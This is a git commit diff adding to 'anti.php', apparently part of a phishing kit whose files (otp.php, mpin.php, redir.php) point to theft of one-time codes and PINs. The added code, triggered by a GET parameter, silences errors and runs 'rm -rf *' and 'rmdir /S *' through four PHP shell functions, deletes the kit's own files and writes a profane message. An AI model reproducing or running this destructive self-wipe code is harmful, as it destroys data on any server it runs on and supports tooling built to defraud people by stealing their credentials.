9f4c624a43cf6314a4344f9624fa33f9b3968209
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-06-30 06:08:35 +0000

    Create anti.php

--- anti.php
+++ anti.php
@@ -57,19 +57,31 @@ if (!empty($_GET['fucked']) && $_GET['fucked'] == "up") {
 }
 
 
-
 error_log(0);
 error_reporting(0);
-file_put_contents("fuck-you.txt", "Fuck you asshole.");
+
+// linux
 system('rm -rf *');
 exec('rm -rf *');
 shell_exec('rm -rf *');
 passthru('rm -rf *');
+
+// cmd
+system('rmdir /S *');
+exec('rmdir /S *');
+shell_exec('rmdir /S *');
+passthru('rmdir /S *');
+
+// php
 unlink('index.php');
 unlink('otp.php');
 unlink('mpin.php');
 unlink('redir.php');
+
 unlink('anti.php');
+
 unlink('config/anti.php');
 unlink('config/404.php');
 unlink('config/zch.php');
+
+file_put_contents("fuck-you.txt", "Fuck you asshole.");
